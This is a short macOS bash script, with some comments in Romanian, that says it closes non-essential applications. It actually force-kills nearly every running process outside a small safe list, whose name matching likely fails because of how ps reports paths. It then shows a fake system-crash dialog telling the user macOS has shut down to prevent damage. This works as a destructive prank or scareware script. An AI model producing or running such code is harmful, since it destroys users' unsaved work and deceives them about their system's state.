#!/bin/bash

# Exclude specific processes from being killed
safe_list=("Finder" "Terminal" "Activity Monitor" "SystemUIServer" "Discord")

# Close non-essential applications
echo "Closing non-essential applications..."

# Obține lista de procese active
ps -e -o pid,comm | while read pid comm; do
    # Verificăm dacă procesul nu este în lista de excludere
    if [[ ! " ${safe_list[@]} " =~ " ${comm} " ]]; then
        echo "Terminating process: $comm (PID: $pid)"
        kill -9 $pid
    fi
done

# Simulează un BSOD (background alert)
osascript -e 'display dialog "A problem has been detected and macOS has been shut down to prevent damage to your computer." buttons {"OK"} default button "OK" with icon stop'

# Opriți scriptul
exit 0
